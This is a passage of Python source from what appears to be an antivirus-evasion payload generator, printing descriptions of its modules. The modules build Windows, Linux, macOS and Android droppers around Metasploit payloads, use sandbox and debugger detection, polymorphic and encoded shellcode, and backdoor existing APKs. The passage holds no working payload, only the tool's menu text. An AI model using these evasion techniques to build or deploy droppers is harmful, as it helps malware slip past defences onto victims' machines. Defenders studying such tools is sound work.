        description += "  [>] Memory allocation type: VIRTUAL\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  if you choose to supply payload via msfvenom \n"
        description += "  than it will be autoencoded with shikata_ga_nai\n"
        description += "  Note that if you want to supply custom shellcode you'll need\n"
        description += "  to evade static analysis if necessary\n\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  What is my name technique \n"
        description += "  Big memory alloc technique\n"
        description += "  Random millions increments \n"
        description += "  Random math subprogram if sandobox detected\n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file \n"

    elif module_type == "MHA_mathinject_windows.py":
        description = ""
        description += "  This Module use static multipath technique to forge\n"
        description += "  Windows dropper written in c able to avoid \n"
        description += "  payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  if you choose to supply payload via msfvenom \n"
        description += "  than it will be autoencoded with shikata_ga_nai\n"
        description += "  Note that if you want to supply custom shellcode you'll need\n"
        description += "  to evade static analysis if necessary\n\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  What is my name technique \n"
        description += "  Big memory alloc techinque\n"
        description += "  Random millions increments \n"
        description += "  Random math subprogram if sandobox detected\n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file \n"

    elif module_type == "Polymorphic_MVA_mathinject_windows.py":
        description = ""
        description += "  This Module use static multipath technique to forge\n"
        description += "  Windows dropper written in c able to avoid \n"
        description += "  payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: VIRTUAL\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  if you choose to supply payload via msfvenom \n"
        description += "  than it will be autoencoded with shikata_ga_nai\n"
        description += "  Note that if you want to supply custom shellcode you'll need\n"
        description += "  to evade static analysis if necessary\n\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Polymorphic Multipath Technique  \n"
        description += "  Random math subprogram if sandobox detected\n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "Polymorphic_MHA_mathinject_windows.py":
        description = ""
        description += "  This Module use static multipath technique to forge\n"
        description += "  Windows dropper written in c able to avoid \n"
        description += "  payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  if you choose to supply payload via msfvenom \n"
        description += "  than it will be autoencoded with shikata_ga_nai\n"
        description += "  Note that if you want to supply custom shellcode you'll need\n"
        description += "  to evade static analysis if necessary\n\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Polymorphic Multipath Technique  \n"
        description += "  Random math subprogram if sandobox detected\n"
        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"

    elif module_type == "MHA_mathinject_linux.py":
        description = ""
        description += "  This Module use static multipath technique to forge\n"
        description += "  Linux dropper written in c able to avoid \n"
        description += "  payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  if you choose to supply payload via msfvenom \n"
        description += "  than it will be autoencoded with shikata_ga_nai\n"
        description += "  Note that if you want to supply custom shellcode you'll need\n"
        description += "  to evade static analysis if necessary\n\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  What is my name technique \n"
        description += "  Big memory alloc techinque\n"
        description += "  Random millions increments \n"
        description += "  Random math subprogram if sandobox detected\n"
        description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"
        description += "  [>] FUD: 95%"

    elif module_type == "Polymorphic_MHA_mathinject_linux.py":
        description = ""
        description += "  This Module use static multipath technique to forge\n"
        description += "  Linux dropper written in c able to avoid \n"
        description += "  payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: HEAP\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  if you choose to supply payload via msfvenom \n"
        description += "  than it will be autoencoded with shikata_ga_nai\n"
        description += "  Note that if you want to supply custom shellcode you'll need\n"
        description += "  to evade static analysis if necessary\n\n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Polymorphic Multipath Technique  \n"
        description += "  Random math subprogram if sandobox detected\n"
        description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"

    elif module_type == "Pytherpreter":

        description = ""
        description += "  This Module use python metasploit payloads to forge\n"
        description += "  executable (for the platform that launch this module) able to \n"
        description += "  avoid payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: managed by python interpreter\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Base 64 Encoded \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Random millions increments  \n"
        description += "  [>] AUTOCOMPILE: using Pyinstaller \n"

    elif module_type == "Pytherpreter_Polymorphic":

        description = ""
        description += "  This Module use python metasploit payloads to forge\n"
        description += "  executable (for the platform that launch this module) able to \n"
        description += "  avoid payload's execution inside most AV sandbox \n\n"
        description += "  [>] Memory allocation type: managed by python interpreter\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Base 64 Encoded \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  Random millions increments  \n"
        description += "  Am i Zero?  \n"
        description += "  Is debugger present?   \n"
        description += "  [>] AUTOCOMPILE: using Pyinstaller \n"


    elif module_type == "Osx_Cascade_Encoding":

        description = ""
        description += "  This Module use osx x64 metasploit payloads to create\n"
        description += "  multi encoded payload in mach-o format \n"
        description += "  [>] Memory allocation type: metasploit\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Multi-Encoded (pure metasploit) \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  None  \n"
        description += "  [>] OUTFORMAT: dmg \n"

    elif module_type == "Smali_Droidmare":

        description = ""
        description += "  This Module decompiles with apktool\n"
        description += "  msfvenom apk payload, modify smali code and \n"
        description += "  rebuild and resign the new apk  \n\n"
        description += "  [>] Support existing apk backdooring\n\n"
        description += "  [>] STATIC EVASION:\n"
        description += "  Nop injection \n"
        description += "  string & path renaming \n"
        description += "  permissions shuffler \n"
        description += "  [>] DYNAMIC EVASION:\n"
        description += "  counters injection in method\n"
        description += "  [>] OUTFORMAT: Apk \n"

    else: 
        description = "NOnEEEE"
    print(description)
    try:   
        ans=input("  Press Enter to continue: ") 
    except SyntaxError:
        pass

    pass
